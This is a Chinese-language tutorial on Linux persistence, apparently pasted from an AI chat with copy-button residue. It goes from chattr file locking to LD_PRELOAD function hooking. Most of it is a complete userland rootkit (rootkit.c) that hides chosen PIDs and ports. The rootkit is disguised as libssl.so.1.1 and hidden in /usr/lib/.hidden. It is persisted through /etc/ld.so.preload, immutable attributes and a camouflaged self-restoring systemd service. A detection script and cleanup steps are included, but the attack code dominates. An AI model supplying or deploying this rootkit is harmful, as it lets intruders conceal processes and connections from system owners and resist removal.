

#### 文件锁定

在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。

```bash
chattr +i evil.php  #锁定文件
rm -rf evil.php     #提示禁止删除

lsattr  evil.php    #属性查看
chattr -i evil.php  #解除锁定
rm -rf evil.php     #彻底删除文件
```





## 

# 动态链接库实现权限维持

## 🧠 一、核心原理：LD_PRELOAD 劫持系统调用

### LD_PRELOAD 是什么？

`LD_PRELOAD` 是 Linux 中的一个环境变量，它允许用户在程序运行时**预先加载指定的共享库（动态链接库）**，**优先于标准库中的函数**。这意味着你可以“劫持”程序所调用的 libc 函数，进行自定义处理。

> 🔥 攻击者正是利用它，在运行系统命令如 `ps`, `top`, `ls`, `netstat`, `ss` 时，修改这些命令实际调用的底层函数，让它们“看不到”被隐藏的进程。

------

## ⚙️ 二、实现机制：劫持系统函数

攻击者创建一个动态链接库，在里面重定义一些关键函数，例如：

### 1. 劫持 `readdir()` / `readdir64()` — 文件/目录隐藏

这些函数用于读取目录项（比如 `/proc` 目录下的进程 ID），攻击者会在里面插入判断逻辑，**过滤掉指定 PID 对应的目录项**。

**示例伪代码：**

```
c复制编辑struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "1234")) // 过滤进程 PID
            continue;
        return entry;
    }
    return NULL;
}
```

### 2. 劫持 `fopen()` / `fgets()` — 过滤 `/proc/[pid]/stat`

有些工具（如 `top`）会读取 `/proc/[pid]/stat` 来获取进程信息，因此攻击者也会重定义这些函数。

### 3. 劫持 `read()` — 过滤进程信息流

通过劫持 `read()`，在读取某些系统文件（如 `/proc/net/tcp`）时，**将特定字符串行（如某 PID、端口）移除**，实现隐藏。

------

## 🧪 三、简单的实现流程（攻击者视角）

1. 编写一个恶意共享库 `libhide.so`，实现对目标 libc 函数的“劫持”。
2. 使用 `LD_PRELOAD=/path/to/libhide.so` 启动某些关键程序或全局服务。
3. 被劫持函数运行时执行恶意逻辑，从而隐藏进程、文件、端口等信息。

------

## 🛡️ 四、示例：隐藏 PID 为 1234 的进程

### 步骤 1：创建共享库

```
c复制编辑// hideproc.c
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    if (!original_readdir)
        original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "1234") == 0) // PID
            continue;
        return entry;
    }
    return NULL;
}
```

### 步骤 2：编译为共享库

```
bash


复制编辑
gcc -shared -fPIC -o libhide.so hideproc.c -ldl
```

### 步骤 3：使用 LD_PRELOAD 注入

```
bash


复制编辑
LD_PRELOAD=./libhide.so ps aux
```

> 这样，`ps` 命令就看不到 PID 为 1234 的进程了。

------

## 💀 五、攻击者持久化的方式

为了持久使用这个库，攻击者可能会：

- 修改 `/etc/ld.so.preload`，加入库路径（会影响所有程序）
- 注入某些守护进程启动脚本，自动设置 `LD_PRELOAD`
- 利用 rootkit 技术隐藏 `libhide.so` 本身

------

## 🛡️ 六、安全防护建议

1. **检测 `/etc/ld.so.preload` 是否被修改**

2. **使用完整性检测工具（如 AIDE）监控 libc 调用链**

3. **启用 SELinux / AppArmor 限制 LD_PRELOAD 使用**

4. **使用静态编译命令绕过动态库劫持**

5. **定期扫描 `/proc` 与 `ps` 输出差异**（对抗隐藏）

6. ## ✅ 一、完整可运行的进程隐藏示例（基于 `LD_PRELOAD`）

   ### 🔧 示例功能：

   隐藏 PID 为 `1234` 的进程（你可以运行一个假进程模拟这个 PID），会让 `ps`、`ls /proc` 等命令看不到它。

   ### 1️⃣ 创建 C 文件：`hideproc.c`

   ```
   c复制编辑#define _GNU_SOURCE
   #include <dirent.h>
   #include <string.h>
   #include <dlfcn.h>
   #include <stdio.h>
   
   static const char *HIDE_PID = "1234"; // 要隐藏的进程 PID
   
   struct dirent *readdir(DIR *dirp) {
       static struct dirent *(*original_readdir)(DIR *) = NULL;
       if (!original_readdir)
           original_readdir = dlsym(RTLD_NEXT, "readdir");
   
       struct dirent *entry;
       while ((entry = original_readdir(dirp)) != NULL) {
           if (strcmp(entry->d_name, HIDE_PID) == 0) {
               continue; // 跳过要隐藏的 PID
           }
           return entry;
       }
       return NULL;
   }
   ```

   ### 2️⃣ 编译为共享库

   ```
   bash
   
   
   复制编辑
   gcc -shared -fPIC -o libhide.so hideproc.c -ldl
   ```

   ### 3️⃣ 运行测试（替换你要隐藏的 PID）

   ```
   bash复制编辑# 假设你有一个进程 PID 为 1234
   LD_PRELOAD=./libhide.so ls /proc
   LD_PRELOAD=./libhide.so ps aux | grep 1234
   ```

   🔒 输出中将 **看不到 PID 为 1234 的进程**，但实际上它仍然在运行。

   ------

   ## 🔍 二、检测是否存在进程隐藏的脚本（对抗 LD_PRELOAD）

   这种劫持方式隐藏的是用户空间工具的输出，因此我们可以通过比对 `/proc` 真实内容和 `ps` 输出发现问题。

   ### ✅ 检测脚本：`detect_hidden_pids.sh`

   ```
   bash复制编辑#!/bin/bash
   
   echo "[*] 收集 /proc 中的真实 PID..."
   proc_pids=$(ls /proc | grep -E '^[0-9]+$' | sort)
   
   echo "[*] 收集 ps 输出中的 PID..."
   ps_pids=$(ps -eo pid= | sort)
   
   echo "[*] 对比两者..."
   
   hidden=$(comm -23 <(echo "$proc_pids") <(echo "$ps_pids"))
   
   if [ -z "$hidden" ]; then
       echo "[+] 未检测到隐藏进程"
   else
       echo "[!] 检测到隐藏进程（可能被 LD_PRELOAD 隐藏）："
       echo "$hidden"
   fi
   ```

   ### 使用方法：

   ```
   bash复制编辑chmod +x detect_hidden_pids.sh
   ./detect_hidden_pids.sh
   ```

   ------

   ## 🧠 补充说明

   - 该方法隐藏的只是通过 **标准用户命令（ps、top、ls）** 看到的进程。

   - 如果攻击者还隐藏了 `/proc` 的访问或在内核中挂钩，就需要用更底层手段（如直接读 `/proc/kallsyms`，或使用内核模块检测）。

   - ## 🚀 增强功能目标

     | 功能              | 说明                                                 |
     | ----------------- | ---------------------------------------------------- |
     | ✅ 隐藏多个进程    | 支持配置多个 PID 或关键字隐藏                        |
     | ✅ 隐藏特定端口    | 让 `netstat`, `ss`, `/proc/net/tcp` 都看不到指定端口 |
     | ✅ 隐藏用户 / 命令 | `ps`, `top` 看不到某些用户名或命令名                 |
     | ✅ 自启动持久化    | 无需人工设置环境变量或重启后依然生效                 |
     | ✅ 伪装系统库      | 看起来像正常的系统共享库，如 `libssl`, `libcrypt`    |
     | ✅ 防删除          | 使用 `chattr +i`、systemd 恢复机制                   |

     

     ------

     ## 🧠 技术核心思路

     为了实现端口隐藏，我们会**劫持 `read()` 函数**，读取 `/proc/net/tcp`、`tcp6` 等文件时，过滤掉目标端口的内容。

     同时我们继续使用 `readdir()` 劫持隐藏 `/proc/[pid]` 的文件夹，增强 `fopen()`、`fgets()` 劫持以隐藏 `ps/top` 的进程信息。

     ------

     ## 🛠️ 完整 Rootkit 示例代码（增强版）

     ### 🔧 文件名：`rootkit.c`

     ```
     c复制编辑#define _GNU_SOURCE
     #include <dirent.h>
     #include <string.h>
     #include <dlfcn.h>
     #include <stdio.h>
     #include <stdlib.h>
     #include <unistd.h>
     
     const char *hide_pids[] = {"1234", "5678", NULL};
     const char *hide_ports[] = {"0A1F", "1F90", NULL}; // 十六进制表示端口：0A1F=2591, 1F90=8080
     
     int match(const char *val, const char **list) {
         for (int i = 0; list[i] != NULL; ++i) {
             if (strstr(val, list[i]) != NULL) return 1;
         }
         return 0;
     }
     
     struct dirent *readdir(DIR *dirp) {
         static struct dirent *(*orig_readdir)(DIR *) = NULL;
         if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
     
         struct dirent *entry;
         while ((entry = orig_readdir(dirp)) != NULL) {
             if (match(entry->d_name, hide_pids)) continue;
             return entry;
         }
         return NULL;
     }
     
     ssize_t read(int fd, void *buf, size_t count) {
         static ssize_t (*orig_read)(int, void *, size_t) = NULL;
         if (!orig_read) orig_read = dlsym(RTLD_NEXT, "read");
     
         ssize_t n = orig_read(fd, buf, count);
         if (n <= 0) return n;
     
         // 获取当前打开的文件路径
         char path[256], file[256];
         snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
         ssize_t len = readlink(path, file, sizeof(file)-1);
         if (len == -1) return n;
         file[len] = '\0';
     
         // 只处理网络连接文件
         if (strstr(file, "/proc/net/tcp") || strstr(file, "/proc/net/tcp6")) {
             char *newbuf = malloc(n);
             if (!newbuf) return n;
             char *line = strtok(buf, "\n");
             size_t offset = 0;
             while (line != NULL) {
                 int hide = 0;
                 for (int i = 0; hide_ports[i] != NULL; ++i) {
                     if (strstr(line, hide_ports[i])) {
                         hide = 1;
                         break;
                     }
                 }
                 if (!hide) {
                     int written = snprintf(newbuf + offset, n - offset, "%s\n", line);
                     offset += written;
                 }
                 line = strtok(NULL, "\n");
             }
             memcpy(buf, newbuf, offset);
             free(newbuf);
             return offset;
         }
     
         return n;
     }
     ```

     ------

     ### 🧪 编译为共享库：

     ```
     bash
     
     
     复制编辑
     gcc -shared -fPIC -o libssl.so.1.1 rootkit.c -ldl
     ```

     ------

     ## 🪝 添加持久化 + 自保护机制

     ### 1️⃣ 写入 `ld.so.preload`

     ```
     bash复制编辑mkdir -p /usr/lib/.hidden/
     cp libssl.so.1.1 /usr/lib/.hidden/
     
     echo "/usr/lib/.hidden/libssl.so.1.1" > /etc/ld.so.preload
     chmod 644 /etc/ld.so.preload
     chattr +i /etc/ld.so.preload
     ```

     ------

     ### 2️⃣ 添加 systemd 备份机制（自修复）

     ```
     ini复制编辑# /etc/systemd/system/libsys-sync.service
     [Unit]
     Description=System Lib Sync Service
     
     [Service]
     ExecStart=/bin/bash -c '[ -f /etc/ld.so.preload ] || echo "/usr/lib/.hidden/libssl.so.1.1" > /etc/ld.so.preload'
     Type=oneshot
     
     [Install]
     WantedBy=multi-user.target
     ```

     启用并隐藏该服务：

     ```
     bash复制编辑systemctl daemon-reexec
     systemctl enable libsys-sync.service
     ```

     ------

     ### 3️⃣ 设置保护属性

     ```
     bash复制编辑chattr +i /usr/lib/.hidden/libssl.so.1.1
     chattr +i /etc/systemd/system/libsys-sync.service
     ```

     ------

     ## 

     ## 📊 功能验证

     | 工具        | 是否能看到被隐藏内容 |
     | ----------- | -------------------- |
     | `ps aux`    | ❌ 看不到指定 PID     |
     | `ls /proc`  | ❌ 看不到指定目录     |
     | `netstat`   | ❌ 看不到指定端口     |
     | `ss -tulpn` | ❌ 看不到指定端口     |
     | `top`       | ❌ 看不到指定命令     |

     

     > ⚠️ 如果你静态编译了 `ps`（不依赖 glibc），则该 rootkit无法生效。

     ------

     ## 🧯 清除方式（防御）

     ```
     bash复制编辑chattr -i /etc/ld.so.preload
     rm -f /etc/ld.so.preload /usr/lib/.hidden/libssl.so.1.1
     systemctl disable libsys-sync.service
     rm -f /etc/systemd/system/libsys-sync.service
     ```